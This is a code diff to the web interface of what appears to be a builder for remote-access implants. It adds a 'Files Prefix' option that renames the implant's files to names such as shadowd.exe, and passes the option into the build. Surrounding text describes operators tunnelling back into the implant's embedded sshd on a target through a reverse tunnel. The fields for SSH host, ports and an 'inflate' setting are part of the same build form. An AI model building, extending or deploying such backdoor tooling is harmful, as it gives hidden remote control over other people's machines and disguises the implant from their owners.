@@ -1034,6 +1034,13 @@
                                 </div>
                             </div>
                         </div>
+                        <div class="form-row" style="margin-bottom:10px;">
+                            <div class="form-field">
+                                <label class="field-label">Files Prefix</label>
+                                <input type="text" id="bh-filesPrefix" value="bolt" placeholder="bolt" style="margin-bottom:0;" />
+                                <p class="field-description" style="margin-top:4px;margin-bottom:0;">Renames bolt* files in the package — e.g. <code>shadow</code> → <code>ShadowFiles/</code>, <code>shadowd.exe</code>, <code>shadowcon.exe</code> … (3–16 lowercase letters/digits)</p>
+                            </div>
+                        </div>
                     </div>
 
                     <div class="section">
@@ -1041,7 +1048,7 @@
                         <p class="field-description">
                             SSH public key(s) your operators use to connect back to the target through the reverse tunnel
                             (i.e. to SSH into the implant's embedded sshd).
-                            Written into <code>BoltFiles/authorized_keys</code> alongside a fresh auto-generated per-build key.
+                            Written into the package's <code>authorized_keys</code> file alongside a fresh auto-generated per-build key.
                             Leave blank to rely solely on the auto-generated operator key downloaded with the build.
                         </p>
                         <div id="bh-opkeys-container">
@@ -1702,6 +1709,7 @@ echo "    ssh -i operator_key -p $TUNNEL_PORT ${cfg.ssh_user}@<this-host>"
                 const providerUrl  = document.getElementById("bh-providerUrl").value.trim();
                 const version      = document.getElementById("bh-version").value.trim() || "1.0.0.0";
                 const inflate      = parseInt(document.getElementById("bh-inflateSlider").value);
+                const filesPrefix  = document.getElementById("bh-filesPrefix").value.trim() || "bolt";
                 const sshHost      = document.getElementById("bh-sshHost").value.trim();
                 const sshUser      = document.getElementById("bh-sshUser").value.trim();
                 const ports        = document.getElementById("bh-ports").value.trim();
@@ -1722,6 +1730,7 @@ echo "    ssh -i operator_key -p $TUNNEL_PORT ${cfg.ssh_user}@<this-host>"
                     provider_url: providerUrl,
                     version,
                     inflate,
+                    files_prefix: filesPrefix,
                     ssh_host: sshHost,
                     ssh_user: sshUser,
                     ports,
